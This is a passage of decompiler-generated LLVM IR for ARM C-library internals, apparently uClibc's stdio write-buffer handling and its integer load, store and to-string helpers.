  store i32 %v2_19650, i32* %v2_19648, align 4
  br i1 %v2_19654, label %dec_label_pc_19704, label %dec_label_pc_19660

dec_label_pc_19660:                               ; preds = %dec_label_pc_1963c
  %v0_19660 = load i32, i32* %r7.global-to-local, align 4
  %v0_19668 = load i32, i32* @r6, align 4
  %v4_1966c = call i32 @memrchr(i32 %v0_19660, i32 10, i32 %v0_19668, i32 %v2_19650)
  %v2_19670 = icmp eq i32 %v4_1966c, 0
  br i1 %v2_19670, label %dec_label_pc_19704, label %dec_label_pc_19678

dec_label_pc_19678:                               ; preds = %dec_label_pc_19660
  %v0_19678 = load i32, i32* @r5, align 4
  store i32 %v0_19678, i32* @r0, align 4
  %v0_1967c = call i32 @__stdio_wcommit()
  %v2_19680 = icmp eq i32 %v0_1967c, 0
  br i1 %v2_19680, label %dec_label_pc_19704, label %dec_label_pc_19688

dec_label_pc_19688:                               ; preds = %dec_label_pc_19678
  %v1_19688 = load i32, i32* @r6, align 4
  %v3_19688 = icmp uge i32 %v0_1967c, %v1_19688
  %v1_19688.v0_1967c = select i1 %v3_19688, i32 %v1_19688, i32 %v0_1967c
  store i32 %v1_19688.v0_1967c, i32* @r4, align 4
  %v2_19694 = sub i32 %v1_19688, %v1_19688.v0_1967c
  %v0_19698 = load i32, i32* %r7.global-to-local, align 4
  %v2_19698 = add i32 %v0_19698, %v2_19694
  store i32 %v2_19698, i32* %r7.global-to-local, align 4
  store i32 %v1_19688.v0_1967c, i32* @r2, align 4
  %v4_196a8 = call i32 @__GI_memchr(i32 %v2_19698, i32 10, i32 %v1_19688.v0_1967c, i32 %v2_19694)
  %v2_196ac = icmp eq i32 %v4_196a8, 0
  br i1 %v2_196ac, label %dec_label_pc_19704, label %dec_label_pc_196b4

dec_label_pc_196b4:                               ; preds = %dec_label_pc_19688
  %v0_196b4 = load i32, i32* @r5, align 4
  %v1_196b4 = add i32 %v0_196b4, 16
  %v2_196b4 = inttoptr i32 %v1_196b4 to i32*
  %v3_196b4 = load i32, i32* %v2_196b4, align 4
  %v0_196b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_196b8 = load i32, i32* @r4, align 4
  %v2_196b8 = sub i32 %v0_196b8, %v4_196a8
  %v2_196bc = add i32 %v2_196b8, %v1_196b8
  %v2_196c0 = sub i32 %v3_196b4, %v2_196bc
  %v1_196c4 = load i32, i32* @r6, align 4
  %v2_196c4 = sub i32 %v1_196c4, %v2_196bc
  store i32 %v2_196c4, i32* @r6, align 4
  store i32 %v2_196c0, i32* %v2_196b4, align 4
  br label %dec_label_pc_19704

dec_label_pc_196d0:                               ; preds = %dec_label_pc_19630
  %v2_196d0 = add i32 %tmp, 8
  %v3_196d0 = inttoptr i32 %v2_196d0 to i32*
  %v4_196d0 = load i32, i32* %v3_196d0, align 4
  %v9_196d4 = icmp eq i32 %v4_195fc, %v4_196d0
  br i1 %v9_196d4, label %dec_label_pc_196f0, label %dec_label_pc_196dc

dec_label_pc_196dc:                               ; preds = %dec_label_pc_196d0
  store i32 %tmp, i32* @r0, align 4
  %v0_196e0 = call i32 @__stdio_wcommit()
  %v2_196e4 = icmp eq i32 %v0_196e0, 0
  br i1 %v2_196e4, label %dec_label_pc_196dc.dec_label_pc_196f0_crit_edge, label %bb14

dec_label_pc_196dc.dec_label_pc_196f0_crit_edge:  ; preds = %dec_label_pc_196dc
  %v0_196f8.pre = load i32, i32* @r6, align 4
  %v0_196f0.pre = load i32, i32* @r5, align 4
  %v0_196f4.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_196fc.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_196f0

bb14:                                             ; preds = %dec_label_pc_196dc
  %v1_196e8 = load i32, i32* @r4, align 4
  store i32 %v1_196e8, i32* @r6, align 4
  br label %dec_label_pc_19704

dec_label_pc_196f0:                               ; preds = %dec_label_pc_196dc.dec_label_pc_196f0_crit_edge, %entry, %dec_label_pc_196d0
  %v2_196fc = phi i32 [ %v2_196fc.pre, %dec_label_pc_196dc.dec_label_pc_196f0_crit_edge ], [ %v3_195d4, %entry ], [ %v3_195d4, %dec_label_pc_196d0 ]
  %v0_196f4 = phi i32 [ %v0_196f4.pre, %dec_label_pc_196dc.dec_label_pc_196f0_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_196d0 ]
  %v0_196f0 = phi i32 [ %v0_196f0.pre, %dec_label_pc_196dc.dec_label_pc_196f0_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_196d0 ]
  %v0_196f8 = phi i32 [ %v0_196f8.pre, %dec_label_pc_196dc.dec_label_pc_196f0_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_196d0 ]
  %v1_196f0 = inttoptr i32 %v0_196f0 to i8*
  store i32 %v2_196fc, i32* @r4, align 4
  store i32 %v9_195d4, i32* @r6, align 4
  store i32 %v15_195d4, i32* @lr, align 4
  %v5_19700 = call i32 @__stdio_WRITE(i8* %v1_196f0, i32 %v0_196f4, i32 %v0_196f8)
  br label %dec_label_pc_19704

dec_label_pc_19704:                               ; preds = %bb14, %dec_label_pc_19688, %dec_label_pc_19678, %dec_label_pc_19660, %dec_label_pc_1963c, %dec_label_pc_196b4, %bb11, %dec_label_pc_196f0
  %v0_19704 = load i32, i32* @r6, align 4
  %v2_19708 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_19708, i32* @r4, align 4
  store i32 %v6_195d4, i32* @r5, align 4
  store i32 %v9_195d4, i32* @r6, align 4
  store i32 %v12_195d4, i32* @r7, align 4
  ret i32 %v0_19704

; uselistorder directives
  uselistorder i32 %v2_196bc, { 1, 0 }
  uselistorder i32 %v2_19694, { 1, 0 }
  uselistorder i32 %v1_19688.v0_1967c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_19688, { 1, 0, 2 }
  uselistorder i32 %v2_19608, { 2, 0, 1, 3 }
  uselistorder i32 %v9_195d4, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32* %r7.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_19704, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_196f0, { 0, 2, 1 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1970c = load i32, i32* @r4, align 4
  store i32 %v3_1970c, i32* %stack_var_-8, align 4
  %v3_19710 = load i8, i8* %arg1, align 1
  %v4_19710 = zext i8 %v3_19710 to i32
  store i32 %v4_19710, i32* %r2.global-to-local, align 4
  %v2_19714 = add i32 %tmp, 1
  %v3_19714 = inttoptr i32 %v2_19714 to i8*
  %v4_19714 = load i8, i8* %v3_19714, align 1
  %v5_19714 = zext i8 %v4_19714 to i32
  store i32 %v5_19714, i32* %r3.global-to-local, align 4
  %v4_19718 = mul nuw nsw i32 %v4_19710, 256
  %v5_19718 = or i32 %v5_19714, %v4_19718
  store i32 %v5_19718, i32* %r2.global-to-local, align 4
  %v2_1971c = and i32 %v5_19718, %arg2
  %v4_1971c = icmp eq i32 %v2_1971c, 0
  store i1 %v4_1971c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_1971c, label %dec_label_pc_19728, label %dec_label_pc_19740

dec_label_pc_19728:                               ; preds = %entry
  %v1_19728 = and i32 %v5_19718, 2176
  %v2_19728 = icmp eq i32 %v1_19728, 0
  store i1 %v2_19728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19728, label %dec_label_pc_19730, label %dec_label_pc_19754

dec_label_pc_19730:                               ; preds = %dec_label_pc_19728
  %v2_19730 = or i32 %v5_19718, %arg2
  store i32 %v2_19730, i32* %r2.global-to-local, align 4
  %v3_19734 = sdiv i32 %v2_19730, 256
  store i32 %v3_19734, i32* %r3.global-to-local, align 4
  %v1_19738 = trunc i32 %v3_19734 to i8
  store i8 %v1_19738, i8* %arg1, align 1
  %v1_1973c = trunc i32 %v2_19730 to i8
  store i8 %v1_1973c, i8* %v3_19714, align 1
  %v0_19740.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19740

dec_label_pc_19740:                               ; preds = %entry, %dec_label_pc_19730
  %v0_19790 = phi i32 [ %tmp, %entry ], [ %v0_19740.pre, %dec_label_pc_19730 ]
  %v1_19740 = inttoptr i32 %v0_19790 to i8*
  %v2_19740 = load i8, i8* %v1_19740, align 1
  %v3_19740 = zext i8 %v2_19740 to i32
  store i32 %v3_19740, i32* %r2.global-to-local, align 4
  %v1_19744 = add i32 %v0_19790, 1
  %v2_19744 = inttoptr i32 %v1_19744 to i8*
  %v3_19744 = load i8, i8* %v2_19744, align 1
  %v4_19744 = zext i8 %v3_19744 to i32
  store i32 %v4_19744, i32* %r3.global-to-local, align 4
  %v4_19748 = mul nuw nsw i32 %v3_19740, 256
  %v1_1974c = and i32 %v4_19744, 32
  %v2_1974c = icmp eq i32 %v1_1974c, 0
  store i1 %v2_1974c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1974c, label %dec_label_pc_19780, label %dec_label_pc_19754

dec_label_pc_19754:                               ; preds = %dec_label_pc_19728, %dec_label_pc_19740
  %v0_19754 = call i32 @__GI___errno_location()
  store i32 %v0_19754, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1975c = inttoptr i32 %v0_19754 to i32*
  store i32 9, i32* %v2_1975c, align 4
  br label %dec_label_pc_19760

dec_label_pc_19760:                               ; preds = %dec_label_pc_197a8, %dec_label_pc_19754
  %v0_19760 = load i32, i32* @r4, align 4
  %v1_19760 = inttoptr i32 %v0_19760 to i32*
  %v2_19760 = load i32, i32* %v1_19760, align 4
  %v3_19764 = udiv i32 %v2_19760, 65536
  %v1_19768 = or i32 %v3_19764, 8
  store i32 %v1_19768, i32* %r3.global-to-local, align 4
  %v3_1976c1 = udiv i32 %v2_19760, 16777216
  store i32 %v3_1976c1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_19774 = trunc i32 %v3_1976c1 to i8
  %v3_19774 = inttoptr i32 %v0_19760 to i8*
  store i8 %v1_19774, i8* %v3_19774, align 1
  %v0_19778 = load i32, i32* %r3.global-to-local, align 4
  %v1_19778 = trunc i32 %v0_19778 to i8
  %v2_19778 = load i32, i32* @r4, align 4
  %v3_19778 = add i32 %v2_19778, 1
  %v4_19778 = inttoptr i32 %v3_19778 to i8*
  store i8 %v1_19778, i8* %v4_19778, align 1
  %v2_1977c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1977c, i32* @r4, align 4
  ret i32 -1

dec_label_pc_19780:                               ; preds = %dec_label_pc_19740
  %tmp20 = urem i8 %v3_19744, 4
  %v2_19780 = icmp eq i8 %tmp20, 0
  store i1 %v2_19780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19780, label %dec_label_pc_197e8, label %dec_label_pc_19788

dec_label_pc_19788:                               ; preds = %dec_label_pc_19780
  %v1_19788 = and i32 %v4_19744, 4
  store i32 %v1_19788, i32* @r1, align 4
  %v2_19788 = icmp eq i32 %v1_19788, 0
  store i1 %v2_19788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19788, label %dec_label_pc_19790, label %dec_label_pc_197c0

dec_label_pc_19790:                               ; preds = %dec_label_pc_19788
  %v1_19790 = add i32 %v0_19790, 20
  %v2_19790 = inttoptr i32 %v1_19790 to i32*
  %v3_19790 = load i32, i32* %v2_19790, align 4
  store i32 %v3_19790, i32* %r2.global-to-local, align 4
  %v1_19794 = add i32 %v0_19790, 16
  %v2_19794 = inttoptr i32 %v1_19794 to i32*
  %v3_19794 = load i32, i32* %v2_19794, align 4
  store i32 %v3_19794, i32* %r3.global-to-local, align 4
  %v9_19798 = icmp eq i32 %v3_19790, %v3_19794
  store i1 %v9_19798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19798, label %dec_label_pc_197a0, label %dec_label_pc_197a8

dec_label_pc_197a0:                               ; preds = %dec_label_pc_19790
  %v1_197a0 = and i32 %v4_19744, 2
  %v2_197a0 = icmp eq i32 %v1_197a0, 0
  store i1 %v2_197a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_197a0, label %dec_label_pc_197c0, label %dec_label_pc_197a8

dec_label_pc_197a8:                               ; preds = %dec_label_pc_19790, %dec_label_pc_197a0
  %v1_197a8 = and i32 %v4_19748, 1024
  %v2_197a8 = icmp eq i32 %v1_197a8, 0
  store i1 %v2_197a8, i1* %cpsr_z.global-to-local, align 1
  %tmp18 = udiv i32 %v1_197a8, 1024
  %tmp19 = add nuw nsw i32 %tmp18, 1
  store i32 %tmp19, i32* @r2, align 4
  %v0_197b4 = call i32 @__GI_fseek()
  store i32 %v0_197b4, i32* %r0.global-to-local, align 4
  %v2_197b8 = icmp eq i32 %v0_197b4, 0
  store i1 %v2_197b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_197b8, label %.dec_label_pc_197c0_crit_edge, label %dec_label_pc_19760

.dec_label_pc_197c0_crit_edge:                    ; preds = %dec_label_pc_197a8
  %v0_197c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_197c0

dec_label_pc_197c0:                               ; preds = %.dec_label_pc_197c0_crit_edge, %dec_label_pc_19788, %dec_label_pc_197a0
  %v2_197d4 = phi i32 [ %v0_197c0.pre, %.dec_label_pc_197c0_crit_edge ], [ %v0_19790, %dec_label_pc_19788 ], [ %v0_19790, %dec_label_pc_197a0 ]
  %v1_197c0 = inttoptr i32 %v2_197d4 to i32*
  %v2_197c0 = load i32, i32* %v1_197c0, align 4
  %v3_197c4 = udiv i32 %v2_197c0, 65536
  store i32 %v3_197c4, i32* %r3.global-to-local, align 4
  %v1_197c8 = add i32 %v2_197d4, 8
  %v2_197c8 = inttoptr i32 %v1_197c8 to i32*
  %v3_197c8 = load i32, i32* %v2_197c8, align 4
  store i32 %v3_197c8, i32* %r1.global-to-local, align 4
  %v1_197cc = and i32 %v3_197c4, 65532
  store i32 %v1_197cc, i32* %r3.global-to-local, align 4
  %v3_197d02 = udiv i32 %v2_197c0, 16777216
  store i32 %v3_197d02, i32* %r2.global-to-local, align 4
  %v1_197d4 = trunc i32 %v3_197d02 to i8
  %v3_197d4 = inttoptr i32 %v2_197d4 to i8*
  store i8 %v1_197d4, i8* %v3_197d4, align 1
  %v0_197d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_197d8 = load i32, i32* @r4, align 4
  %v2_197d8 = add i32 %v1_197d8, 20
  %v3_197d8 = inttoptr i32 %v2_197d8 to i32*
  store i32 %v0_197d8, i32* %v3_197d8, align 4
  %v0_197dc = load i32, i32* %r3.global-to-local, align 4
  %v1_197dc = trunc i32 %v0_197dc to i8
  %v2_197dc = load i32, i32* @r4, align 4
  %v3_197dc = add i32 %v2_197dc, 1
  %v4_197dc = inttoptr i32 %v3_197dc to i8*
  store i8 %v1_197dc, i8* %v4_197dc, align 1
  %v0_197e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_197e0 = load i32, i32* @r4, align 4
  %v2_197e0 = add i32 %v1_197e0, 24
  %v3_197e0 = inttoptr i32 %v2_197e0 to i32*
  store i32 %v0_197e0, i32* %v3_197e0, align 4
  %v0_197e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_197e4 = load i32, i32* @r4, align 4
  %v2_197e4 = add i32 %v1_197e4, 16
  %v3_197e4 = inttoptr i32 %v2_197e4 to i32*
  store i32 %v0_197e4, i32* %v3_197e4, align 4
  %v0_197e8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_197e8

dec_label_pc_197e8:                               ; preds = %dec_label_pc_19780, %dec_label_pc_197c0
  %v2_19804 = phi i32 [ %v0_19790, %dec_label_pc_19780 ], [ %v0_197e8.pre, %dec_label_pc_197c0 ]
  %v1_197e8 = inttoptr i32 %v2_19804 to i32*
  %v2_197e8 = load i32, i32* %v1_197e8, align 4
  %v1_197f4 = udiv i32 %v2_197e8, 65536
  %v3_197f8 = or i32 %v1_197f4, 64
  store i32 %v3_197f8, i32* %r2.global-to-local, align 4
  %v1_197fc = and i32 %v1_197f4, 2816
  store i32 %v1_197fc, i32* %r0.global-to-local, align 4
  %v2_197fc = icmp eq i32 %v1_197fc, 0
  store i1 %v2_197fc, i1* %cpsr_z.global-to-local, align 1
  %v3_198003 = udiv i32 %v2_197e8, 16777216
  store i32 %v3_198003, i32* %r3.global-to-local, align 4
  %v1_19804 = trunc i32 %v3_198003 to i8
  %v3_19804 = inttoptr i32 %v2_19804 to i8*
  store i8 %v1_19804, i8* %v3_19804, align 1
  %v0_19808 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_19808 = load i32, i32* @r4, align 4
  br i1 %v0_19808, label %bb14, label %.thread4

bb14:                                             ; preds = %dec_label_pc_197e8
  %v2_19808 = add i32 %v1_19808, 12
  %v3_19808 = inttoptr i32 %v2_19808 to i32*
  %v4_19808 = load i32, i32* %v3_19808, align 4
  store i32 %v4_19808, i32* %r3.global-to-local, align 4
  br label %bb15

.thread4:                                         ; preds = %dec_label_pc_197e8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %bb14, %.thread4
  %v0_19810 = load i32, i32* %r2.global-to-local, align 4
  %v1_19810 = trunc i32 %v0_19810 to i8
  %v3_19810 = add i32 %v1_19808, 1
  %v4_19810 = inttoptr i32 %v3_19810 to i8*
  store i8 %v1_19810, i8* %v4_19810, align 1
  %v0_19814 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19814, label %bb16, label %bb17

bb16:                                             ; preds = %bb15
  %v1_19814 = load i32, i32* %r3.global-to-local, align 4
  %v2_19814 = load i32, i32* @r4, align 4
  %v3_19814 = add i32 %v2_19814, 28
  %v4_19814 = inttoptr i32 %v3_19814 to i32*
  store i32 %v1_19814, i32* %v4_19814, align 4
  br label %bb17

bb17:                                             ; preds = %bb15, %bb16
  %v2_19818 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19818, i32* @r4, align 4
  %v8_19818 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_19818

; uselistorder directives
  uselistorder i32 %v3_198003, { 1, 0 }
  uselistorder i32 %v1_197f4, { 1, 0 }
  uselistorder i32 %v3_197d02, { 1, 0 }
  uselistorder i32 %v3_197c4, { 1, 0 }
  uselistorder i1 %v2_19780, { 1, 0 }
  uselistorder i32 %v3_1976c1, { 1, 0 }
  uselistorder i32 %v0_19790, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_19734, { 1, 0 }
  uselistorder i32 %v5_19718, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 11, 10, 12, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 7, 8, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 1, 2, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_197e8, { 1, 0 }
  uselistorder label %dec_label_pc_197c0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_197a8, { 1, 0 }
  uselistorder label %dec_label_pc_19754, { 1, 0 }
  uselistorder label %dec_label_pc_19740, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_19820 = load i32, i32* @r2, align 4
  %v1_19820 = icmp slt i32 %v0_19820, 0
  %v0_19824 = load i32, i32* @r0, align 4
  %v1_19828 = and i32 %v0_19824, 2048
  %v2_19860 = icmp eq i32 %v1_19828, 0
  br i1 %v1_19820, label %dec_label_pc_19860, label %dec_label_pc_19830

dec_label_pc_19830:                               ; preds = %entry
  br i1 %v2_19860, label %dec_label_pc_19838, label %dec_label_pc_19868

dec_label_pc_19838:                               ; preds = %dec_label_pc_19830
  %v7_19838 = icmp eq i32 %v0_19824, 256
  %v0_1983c = load i32, i32* @r1, align 4
  %v1_1983c = inttoptr i32 %v0_1983c to i32*
  %v2_1983c = load i32, i32* %v1_1983c, align 4
  %v2_19840 = urem i32 %v2_1983c, 256
  %v2_19840.v2_1983c = select i1 %v7_19838, i32 %v2_19840, i32 %v2_1983c
  br i1 %v7_19838, label %.thread, label %dec_label_pc_19848

dec_label_pc_19848:                               ; preds = %dec_label_pc_19838
  %v7_19848 = icmp eq i32 %v0_19824, 512
  br i1 %v7_19848, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_19848
  %v4_19850 = urem i32 %v2_19840.v2_1983c, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_19848, %dec_label_pc_19838, %bb
  %v0_19854 = phi i32 [ %v2_1983c, %dec_label_pc_19848 ], [ %v2_19840, %dec_label_pc_19838 ], [ %v4_19850, %bb ]
  store i32 %v0_19854, i32* @r1, align 4
  ret i32 0

dec_label_pc_19860:                               ; preds = %entry
  br i1 %v2_19860, label %dec_label_pc_19870, label %dec_label_pc_19868

dec_label_pc_19868:                               ; preds = %dec_label_pc_19830, %dec_label_pc_19860
  %v0_19868 = load i32, i32* @r1, align 4
  %v1_19868 = inttoptr i32 %v0_19868 to i32*
  %v2_19868 = load i32, i32* %v1_19868, align 4
  %v3_19868 = add i32 %v0_19868, 4
  %v4_19868 = inttoptr i32 %v3_19868 to i32*
  %v5_19868 = load i32, i32* %v4_19868, align 4
  store i32 %v5_19868, i32* @r1, align 4
  ret i32 %v2_19868

dec_label_pc_19870:                               ; preds = %dec_label_pc_19860
  %v7_19870 = icmp eq i32 %v0_19824, 256
  %v0_19874 = load i32, i32* @r1, align 4
  %v1_19874 = inttoptr i32 %v0_19874 to i32*
  %v2_19874 = load i32, i32* %v1_19874, align 4
  %v2_19878 = urem i32 %v2_19874, 256
  %v2_19878.v2_19874 = select i1 %v7_19870, i32 %v2_19878, i32 %v2_19874
  br i1 %v7_19870, label %.thread2, label %dec_label_pc_19880

dec_label_pc_19880:                               ; preds = %dec_label_pc_19870
  %v7_19880 = icmp eq i32 %v0_19824, 512
  br i1 %v7_19880, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_19880
  %v4_19884 = mul i32 %v2_19878.v2_19874, 65536
  %v4_19888 = sdiv i32 %v4_19884, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19880, %dec_label_pc_19870, %bb5
  %v0_1988c = phi i32 [ %v2_19874, %dec_label_pc_19880 ], [ %v2_19878, %dec_label_pc_19870 ], [ %v4_19888, %bb5 ]
  store i32 %v0_1988c, i32* @r1, align 4
  %v3_19890 = ashr i32 %v0_1988c, 31
  ret i32 %v3_19890

; uselistorder directives
  uselistorder i32 %v0_1988c, { 1, 0 }
  uselistorder i32 %v2_19878, { 1, 0 }
  uselistorder i32 %v2_19874, { 1, 2, 0 }
  uselistorder i32 %v2_19840, { 1, 0 }
  uselistorder i32 %v2_1983c, { 1, 2, 0 }
  uselistorder i1 %v2_19860, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19868, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v7_19898 = icmp eq i32 %arg2, 256
  store i1 %v7_19898, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  br i1 %v7_19898, label %bb, label %.thread

.thread:                                          ; preds = %entry
  store i32 %arg4, i32* %r2.global-to-local, align 4
  br label %bb8

bb:                                               ; preds = %entry
  %v2_198a4 = trunc i32 %arg4 to i8
  store i8 %v2_198a4, i8* %arg1, align 1
  %v0_198ac.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_198a8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_198a8, i32* %r2.global-to-local, align 4
  br i1 %v0_198ac.pr, label %bb7, label %._crit_edge

._crit_edge:                                      ; preds = %bb
  %v0_198b0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb8

bb7:                                              ; preds = %.thread4, %.thread3, %bb
  ret i32 %tmp

bb8:                                              ; preds = %._crit_edge, %.thread
  %v1_198c4 = phi i32 [ %v0_198a8, %._crit_edge ], [ %arg4, %.thread ]
  %v0_198c0 = phi i32 [ %v0_198b0.pre, %._crit_edge ], [ %arg2, %.thread ]
  %v7_198b0 = icmp eq i32 %v0_198c0, 2048
  store i1 %v7_198b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_198b0, label %dec_label_pc_198b8, label %dec_label_pc_198c0

dec_label_pc_198b8:                               ; preds = %bb8
  %tmp9 = bitcast i8* %arg1 to i32*
  %v3_198b8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_198b8, i32* %tmp9, align 4
  %v4_198b8 = add i32 %tmp, 4
  %v5_198b8 = inttoptr i32 %v4_198b8 to i32*
  %v6_198b8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v6_198b8, i32* %v5_198b8, align 4
  ret i32 %tmp

dec_label_pc_198c0:                               ; preds = %bb8
  %v7_198c0 = icmp eq i32 %v0_198c0, 512
  store i1 %v7_198c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_198c0, label %.thread2, label %.thread4

.thread2:                                         ; preds = %dec_label_pc_198c0
  %v4_198c4 = sdiv i32 %v1_198c4, 256
  store i32 %v4_198c4, i32* %r3.global-to-local, align 4
  %v2_198c8 = trunc i32 %v4_198c4 to i8
  store i8 %v2_198c8, i8* %arg1, align 1
  %v0_198cc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_198cc.pr.pr, label %.thread3, label %.thread4

.thread3:                                         ; preds = %.thread2
  %v1_198cc = load i32, i32* %r2.global-to-local, align 4
  %v2_198cc = trunc i32 %v1_198cc to i8
  %v5_198cc = add i32 %tmp, 1
  %v6_198cc = inttoptr i32 %v5_198cc to i8*
  store i8 %v2_198cc, i8* %v6_198cc, align 1
  %v0_198d0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_198d0.pr.pr, label %bb7, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_198c0, %.thread2, %.thread3
  %v1_198d0 = load i32, i32* %r2.global-to-local, align 4
  %tmp10 = bitcast i8* %arg1 to i32*
  store i32 %v1_198d0, i32* %tmp10, align 4
  br label %bb7

; uselistorder directives
  uselistorder i32 %v4_198c4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %.thread4, { 2, 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_198dc = icmp slt i32 %arg4, 0
  %v2_198dc = icmp eq i32 %arg4, 0
  store i1 %v2_198dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v1_198dc, label %dec_label_pc_198f4, label %dec_label_pc_19914

dec_label_pc_198f4:                               ; preds = %entry
  %v1_198f4 = icmp slt i32 %arg2, 0
  %v2_198f4 = icmp eq i32 %arg2, 0
  store i1 %v2_198f4, i1* %cpsr_z.global-to-local, align 1
  %v1_198f8 = sub i32 0, %arg4
  store i32 %v1_198f8, i32* %r7.global-to-local, align 4
  br i1 %v1_198f4, label %dec_label_pc_19900, label %dec_label_pc_19914

